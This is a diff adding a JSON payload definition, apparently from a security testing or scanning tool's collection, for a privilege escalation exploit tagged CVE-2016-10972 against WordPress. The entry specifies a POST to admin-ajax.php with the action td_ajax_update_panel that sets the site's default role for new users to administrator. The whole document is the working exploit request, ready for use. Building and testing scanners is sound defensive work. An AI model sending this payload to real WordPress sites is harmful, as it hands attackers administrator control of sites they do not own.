@@ -1,0 +1,17 @@
+{
+    "categories": ["PRIVILEGE ESCALATION", "CVE"],
+    "tags": ["curl", "post", "wordpress", "ajax", "backdoor", "privilege escalation", "CVE-2016-10972"],
+    "description": "Payload que intenta escalar privilegios en WordPress mediante admin-ajax.php",
+    "payload": {
+        "route": "/wp-admin/admin-ajax.php",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": {
+            "action": "td_ajax_update_panel",
+            "wp_option[default_role]": "administrator"
+        },
+        "query": {}
+    }
+}
